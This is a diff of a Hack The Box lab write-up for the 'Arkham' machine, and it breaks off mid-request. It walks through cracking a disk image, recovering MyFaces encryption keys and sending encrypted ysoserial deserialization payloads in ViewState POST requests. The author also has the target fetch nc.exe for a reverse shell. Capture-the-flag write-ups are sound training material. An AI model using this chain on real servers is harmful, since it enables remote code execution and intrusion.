@@ -85,13 +85,13 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.130</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">arkham.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/arkham/0.png" alt=""></p>
+<br><img src="/images/hackthebox/arkham/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC arkham.htb</code>
-<img src="/images/hackthebox/arkham/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC arkham.htb</code>
+<br><img src="/images/hackthebox/arkham/1.png" alt=""><br>
 <br> We have <code class="highlighter-rouge">http</code> on port 80, 8080 and <code class="highlighter-rouge">smb</code>, I checked <code class="highlighter-rouge">smb</code> first.
 <br></p>
 <hr>
@@ -187,10 +187,8 @@ Password found: batmanforever
 root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
 </code></pre></div></div>
 <p><br> It worked and the password was <code class="highlighter-rouge">batmanforever</code>.
-<img src="/images/hackthebox/arkham/2.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/arkham/3.png" alt="">
+<br><img src="/images/hackthebox/arkham/2.png" alt=""><br>
+<br><img src="/images/hackthebox/arkham/3.png" alt=""><br>
 <br> It had a directory called <code class="highlighter-rouge">Mask</code> so I copied it then I unmounted the image.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# ls -la
 total 18
@@ -240,29 +238,27 @@ root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs#
 
 <p><br> HTTP Enumeration
 <br> Port 80 had nothing running, there was only the default <code class="highlighter-rouge">IIS</code> index page and no subdirectories.
-<img src="/images/hackthebox/arkham/4.png" alt="">
+<br><img src="/images/hackthebox/arkham/4.png" alt=""><br>
 <br> On port 8080 there was a website with some links :
-<img src="/images/hackthebox/arkham/5.png" alt="">
+<br><img src="/images/hackthebox/arkham/5.png" alt=""><br>
 <br> One of the links was the subscription link : <code class="highlighter-rouge">http://arkham.htb:8080/userSubscribe.faces</code>
-<img src="/images/hackthebox/arkham/6.png" alt="">
+<br><img src="/images/hackthebox/arkham/6.png" alt=""><br>
 <br> I tested it to see what will happen :
-<img src="/images/hackthebox/arkham/7.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/arkham/8.png" alt="">
+<br><img src="/images/hackthebox/arkham/7.png" alt=""><br>
+<br><img src="/images/hackthebox/arkham/8.png" alt=""><br>
 <br> Nothing interesting, I intercepted the request with <code class="highlighter-rouge">burp</code> and found some interesting parameters in the POST request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
-Host: arkham.htb:8080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://arkham.htb:8080/userSubscribe.faces
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 257
-Cookie: JSESSIONID=F018FBFC4605B1C80EB54D5CA2A46B91
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/userSubscribe.faces</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">arkham.htb:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://arkham.htb:8080/userSubscribe.faces</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">257</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">JSESSIONID=F018FBFC4605B1C80EB54D5CA2A46B91</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
 </code></pre></div></div>
@@ -292,27 +288,27 @@ j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&am
 <p><br></p>
 
 <p><br> When I tried to decode the base-64 encoded value I got nothing readable:
-<img src="/images/hackthebox/arkham/9.png" alt="">
+<br><img src="/images/hackthebox/arkham/9.png" alt=""><br>
 <br> I redirected the output into a file and ran <code class="highlighter-rouge">file</code> command against it, and I got <code class="highlighter-rouge">data</code> instead of <code class="highlighter-rouge">Java serialization data</code>.
 <br> This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.
 <br> In <code class="highlighter-rouge">web.xml.bak</code> I found the key used to encrypt the data, also the MAC algorithm which was <code class="highlighter-rouge">hmac-sha1</code> and the used key.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ----------------
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ----------------
      Removed Output
     ----------------
-&lt;context-param&gt;     
+<span class="nt">&lt;context-param&gt;</span>     
 
-&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;                                                                     
-&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;                                                                                
-&lt;/context-param&gt;                                                                                                       
-    &lt;context-param&gt;                                                                                                    
-        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;                                                      
-        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;                                                                            
-     &lt;/context-param&gt;
-&lt;context-param&gt;
-&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;
-&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
-&lt;/context-param&gt;
-&lt;context-param&gt;
+<span class="nt">&lt;param-name&gt;</span>org.apache.myfaces.SECRET<span class="nt">&lt;/param-name&gt;</span>                                                                     
+<span class="nt">&lt;param-value&gt;</span>SnNGOTg3Ni0=<span class="nt">&lt;/param-value&gt;</span>                                                                                
+<span class="nt">&lt;/context-param&gt;</span>                                                                                                       
+    <span class="nt">&lt;context-param&gt;</span>                                                                                                    
+        <span class="nt">&lt;param-name&gt;</span>org.apache.myfaces.MAC_ALGORITHM<span class="nt">&lt;/param-name&gt;</span>                                                      
+        <span class="nt">&lt;param-value&gt;</span>HmacSHA1<span class="nt">&lt;/param-value&gt;</span>                                                                            
+     <span class="nt">&lt;/context-param&gt;</span>
+<span class="nt">&lt;context-param&gt;</span>
+<span class="nt">&lt;param-name&gt;</span>org.apache.myfaces.MAC_SECRET<span class="nt">&lt;/param-name&gt;</span>
+<span class="nt">&lt;param-value&gt;</span>SnNGOTg3Ni0=<span class="nt">&lt;/param-value&gt;</span>
+<span class="nt">&lt;/context-param&gt;</span>
+<span class="nt">&lt;context-param&gt;</span>
     ----------------
      Removed Output
     ----------------
@@ -325,7 +321,7 @@ JsF9876-
 <br> We have everything we need to encrypt the data correctly, I wrote a python script to do it. 
 <br> Basically I’m going to create the payload with <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">ysoserial</code></a> then use my script to encrypt it.
 <br> <code class="highlighter-rouge">viewstate.py</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">hmac</span>
 <span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
@@ -387,33 +383,33 @@ WARNING: All illegal access operations will be denied in a future release
 root@kali:~/Desktop/HTB/boxes/arkham# 
 </code></pre></div></div>
 <p><br> Then I encrypted them with my script :
-<img src="/images/hackthebox/arkham/10.png" alt="">
+<br><img src="/images/hackthebox/arkham/10.png" alt=""><br>
 <br> I ran a python server to host <code class="highlighter-rouge">nc.exe</code> and I started my <code class="highlighter-rouge">nc</code> listener on port 1337, then I sent the payloads. 
 <br> 1st Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
-Host: arkham.htb:8080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://arkham.htb:8080/userSubscribe.faces
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 3197
-Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/userSubscribe.faces</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">arkham.htb:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://arkham.htb:8080/userSubscribe.faces</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3197</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BTweGj5FUR%2FlCPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPSGioyPZd%2FiNpmNoUDeaeXEVrvY0L%2FaRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV%2BJ4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o%2B53eYRjgAQvWxmK%2FVII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla%2B%2FLyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37%2Ftu0vBXvZz%2Bls4886hDPhV3RdASjsJaoZPrEReF8f43oev%2Bx6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK%2Fs8Az9gV7hyTmqI0ewkaYsX9uSA%2F9wVoArXnRX%2FrTg7PxMp9hGNKQN%2Fklr%2BXyc%3D
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 500 
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">HTTP/1.1 500 
 Content-Type: text/html;charset=utf-8
 Content-Language: en
 Content-Length: 2570
 Date: Fri, 09 Aug 2019 18:36:52 GMT
 Connection: close
 
-<span class="cp">&lt;!doctype html&gt;</span><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;&lt;head&gt;&lt;title&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/title&gt;&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;h1</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">22px</span><span class="p">;}</span> <span class="nt">h2</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">16px</span><span class="p">;}</span> <span class="nt">h3</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;}</span> <span class="nt">body</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="no">white</span><span class="p">;}</span> <span class="nt">b</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;}</span> <span class="nt">p</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">background</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">12px</span><span class="p">;}</span> <span class="nt">a</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nt">a</span><span class="nc">.name</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nc">.line</span> <span class="p">{</span><span class="nl">height</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">border</span><span class="p">:</span><span class="nb">none</span><span class="p">;}</span><span class="nt">&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/h1&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;p&gt;&lt;b&gt;</span>Type<span class="nt">&lt;/b&gt;</span> Exception Report<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Message<span class="nt">&lt;/b&gt;</span> class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Description<span class="nt">&lt;/b&gt;</span> The server encountered an unexpected condition that prevented it from fulfilling the request.<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Exception<span class="nt">&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;</span>java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)
+&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 â Internal Server Error&lt;/title&gt;&lt;style type="text/css"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 â Internal Server Error&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)
         org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
         org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
         org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
@@ -423,34 +419,34 @@ Connection: close
         org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
         javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
         org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
-<span class="nt">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;</span>Note<span class="nt">&lt;/b&gt;</span> The full stack trace of the root cause is available in the server logs.<span class="nt">&lt;/p&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;h3&gt;</span>Apache Tomcat/8.5.37<span class="nt">&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span>
-</code></pre></div></div>
+&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/8.5.37&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
 <p><br> I got a 500, and when I checked my python server I saw that I got a request so everything is fine.
 <br> 2nd Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
-Host: arkham.htb:8080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://arkham.htb:8080/userSubscribe.faces
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 3109
-Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/userSubscribe.faces</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">arkham.htb:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://arkham.htb:8080/userSubscribe.faces</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3109</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOys